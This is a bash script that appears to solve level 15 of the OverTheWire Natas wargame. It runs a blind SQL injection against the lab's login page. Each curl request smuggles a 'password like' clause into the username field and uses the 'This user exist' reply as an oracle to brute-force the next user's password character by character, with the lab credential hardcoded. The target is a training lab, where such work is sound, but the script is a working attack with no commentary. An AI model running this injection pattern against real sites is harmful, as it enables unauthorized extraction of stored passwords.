#!/bin/bash

val=$1
done=false

for i in {a..z}; do
	response=$(curl -s -u natas15:GB6USCJYJjwLyYhZUNkE1NwDueiTow6g -d "username=natas16\" and password like \"$val$i%" -d "debug" "http://natas15.natas.labs.overthewire.org")
	if [[ *"$response"* == *"This user exist"* ]]; then
		response=$(curl -s -u natas15:GB6USCJYJjwLyYhZUNkE1NwDueiTow6g -d "username=natas16\" and password like binary \"$val$i%" -d "debug" "http://natas15.natas.labs.overthewire.org")
		if [[ *"$response"* == *"This user exist"* ]]; then
			echo $i
		else
			echo "$i" | tr '[:lower:]' '[:upper:]'
		fi
		done=true
		break
	fi
done

for i in {0..9}; do
	if [[ $done == false ]]; then
		response=$(curl -s -u natas15:GB6USCJYJjwLyYhZUNkE1NwDueiTow6g -d "username=natas16\" and password like \"$val$i%" -d "debug" "http://natas15.natas.labs.overthewire.org")
        	if [[ *"$response"* == *"This user exist"* ]]; then
                	echo $i
		fi
        fi
done

